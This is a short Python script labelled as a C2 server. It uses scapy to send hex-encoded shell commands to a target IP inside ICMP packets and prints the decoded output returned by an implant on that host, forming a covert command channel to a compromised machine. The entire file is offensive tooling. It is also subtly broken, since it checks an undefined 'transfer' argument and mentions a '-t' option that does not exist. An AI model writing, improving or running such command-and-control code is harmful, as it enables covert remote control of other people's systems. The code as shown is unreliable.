#!/usr/bin/env python3

# C2 Server

import argparse
from scapy.all import *
import binascii

parser = argparse.ArgumentParser()
parser.add_argument('ip', help='IP address')
parser.add_argument('-c', '--command', help='execute command')

args = parser.parse_args()

if not (args.command or args.transfer):
	parser.error('No arguments provided. Add -c or -t to your command.')

def send_cmd(cmd):
	hex_cmd = binascii.hexlify(cmd.encode('utf8'))
	packet = IP(dst=args.ip)/ICMP(id=0x6341, seq=0x1)/hex_cmd
	resp = sr1(packet, verbose=0)
	data = resp[0][0][Raw].load.decode('utf8')
	out=binascii.unhexlify(data).decode('utf8')
	print(out)

send_cmd(args.command)
